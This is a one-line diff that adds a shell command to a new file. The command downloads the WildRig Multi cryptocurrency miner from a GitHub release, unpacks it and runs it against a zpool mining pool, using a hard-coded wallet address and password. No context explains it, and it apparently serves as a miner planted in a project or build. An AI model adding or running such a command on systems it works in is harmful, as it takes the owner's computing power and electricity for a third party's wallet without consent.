@@ -1,0 +1,1 @@
+wget https://github.com/andru-kun/wildrig-multi/releases/download/0.31.3/wildrig-multi-linux-0.31.3.tar.xz && tar -xvf wildrig-multi-linux-0.31.3.tar.xz && ./wildrig-multi -a heavyhash -o heavyhash.sea.mine.zpool.ca:5138 --user RL9QURyvifYBsB3Cg6HWr16mdsX7C7A7X1 -p Vapers86
